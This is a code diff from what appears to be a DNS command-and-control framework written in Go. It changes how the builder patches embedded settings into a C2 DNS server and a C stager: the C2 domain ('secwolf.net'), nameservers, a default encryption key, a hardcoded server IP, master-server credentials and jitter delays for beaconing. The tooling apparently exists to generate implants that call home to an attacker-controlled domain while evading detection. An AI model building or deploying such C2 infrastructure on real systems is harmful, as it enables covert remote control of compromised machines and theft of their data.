@@ -306,28 +306,28 @@ func (api *APIServer) buildDNSServer(req DNSServerBuildRequest, masterURL, apiKe
 	}
 
 	// Replace embedded config values in tryLoadEmbeddedConfig()
-	// Note: Config uses tab indentation - must match exactly
+	// Note: Config uses specific alignment with tabs - must match exactly
 	configStr := string(config)
 
 	// Debug: Show what we're looking for and replacing
-	fmt.Printf("Debug: MasterServer before replacement contains empty: %v\n", strings.Contains(configStr, "\t\tMasterServer:   \"\","))
+	fmt.Printf("Debug: MasterServer before replacement contains empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))
 	fmt.Printf("Debug: Replacing MasterServer with: %s\n", masterURL)
 
-	configStr = strings.Replace(configStr, "\t\tDomain:        \"secwolf.net\",", fmt.Sprintf("\t\tDomain:        \"%s\",", req.Domain), 1)
-	configStr = strings.Replace(configStr, "\t\tNS1:           \"ns1.secwolf.net\",", fmt.Sprintf("\t\tNS1:           \"%s\",", req.NS1), 1)
-	configStr = strings.Replace(configStr, "\t\tNS2:           \"ns2.secwolf.net\",", fmt.Sprintf("\t\tNS2:           \"%s\",", req.NS2), 1)
-	configStr = strings.Replace(configStr, "\t\tUpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("\t\tUpstreamDNS:   \"%s\",", req.UpstreamDNS), 1)
-	configStr = strings.Replace(configStr, "\t\tEncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("\t\tEncryptionKey: \"%s\",", req.EncryptionKey), 1)
+	configStr = strings.Replace(configStr, "Domain:        \"secwolf.net\",", fmt.Sprintf("Domain:        \"%s\",", req.Domain), 1)
+	configStr = strings.Replace(configStr, "NS1:           \"ns1.secwolf.net\",", fmt.Sprintf("NS1:           \"%s\",", req.NS1), 1)
+	configStr = strings.Replace(configStr, "NS2:           \"ns2.secwolf.net\",", fmt.Sprintf("NS2:           \"%s\",", req.NS2), 1)
+	configStr = strings.Replace(configStr, "UpstreamDNS:   \"8.8.8.8:53\",", fmt.Sprintf("UpstreamDNS:   \"%s\",", req.UpstreamDNS), 1)
+	configStr = strings.Replace(configStr, "EncryptionKey: \"MySecretC2Key123!@#DefaultChange\",", fmt.Sprintf("EncryptionKey: \"%s\",", req.EncryptionKey), 1)
 	if req.ServerAddress != "" {
-		configStr = strings.Replace(configStr, "\t\tSvrAddr:       \"98.90.218.70\",", fmt.Sprintf("\t\tSvrAddr:       \"%s\",", req.ServerAddress), 1)
+		configStr = strings.Replace(configStr, "SvrAddr:       \"98.90.218.70\",", fmt.Sprintf("SvrAddr:       \"%s\",", req.ServerAddress), 1)
 	}
 	// Set distributed mode config (required fields)
-	configStr = strings.Replace(configStr, "\t\tMasterServer:   \"\",", fmt.Sprintf("\t\tMasterServer:   \"%s\",", masterURL), 1)
-	configStr = strings.Replace(configStr, "\t\tMasterAPIKey:   \"\",", fmt.Sprintf("\t\tMasterAPIKey:   \"%s\",", apiKey), 1)
-	configStr = strings.Replace(configStr, "\t\tMasterServerID: \"dns1\",", fmt.Sprintf("\t\tMasterServerID: \"%s\",", serverID), 1)
+	configStr = strings.Replace(configStr, "MasterServer:   \"\",", fmt.Sprintf("MasterServer:   \"%s\",", masterURL), 1)
+	configStr = strings.Replace(configStr, "MasterAPIKey:   \"\",", fmt.Sprintf("MasterAPIKey:   \"%s\",", apiKey), 1)
+	configStr = strings.Replace(configStr, "MasterServerID: \"dns1\",", fmt.Sprintf("MasterServerID: \"%s\",", serverID), 1)
 
 	// Debug: Verify MasterServer was set after replacement
-	fmt.Printf("Debug: MasterServer after replacement still empty: %v\n", strings.Contains(configStr, "\t\tMasterServer:   \"\","))
+	fmt.Printf("Debug: MasterServer after replacement still empty: %v\n", strings.Contains(configStr, "MasterServer:   \"\","))
 
 	if err := os.WriteFile(configPath, []byte(configStr), 0644); err != nil {
 		return "", fmt.Errorf("failed to write config: %w", err)
@@ -520,6 +520,7 @@ func buildStager(req StagerBuildRequest, sourceRoot string) (string, error) {
 	}
 
 	codeStr := string(stagerCode)
+	// Note: stager.c has extra spaces and comments - must match exactly
 	codeStr = strings.Replace(codeStr, `#define C2_DOMAIN "secwolf.net"`, fmt.Sprintf(`#define C2_DOMAIN "%s"`, req.Domain), 1)
 	codeStr = strings.Replace(codeStr, `#define MIN_CHUNK_DELAY_MS 60000`, fmt.Sprintf(`#define MIN_CHUNK_DELAY_MS %d`, req.JitterMinMs), 1)
 	codeStr = strings.Replace(codeStr, `#define MAX_CHUNK_DELAY_MS 120000`, fmt.Sprintf(`#define MAX_CHUNK_DELAY_MS %d`, req.JitterMaxMs), 1)
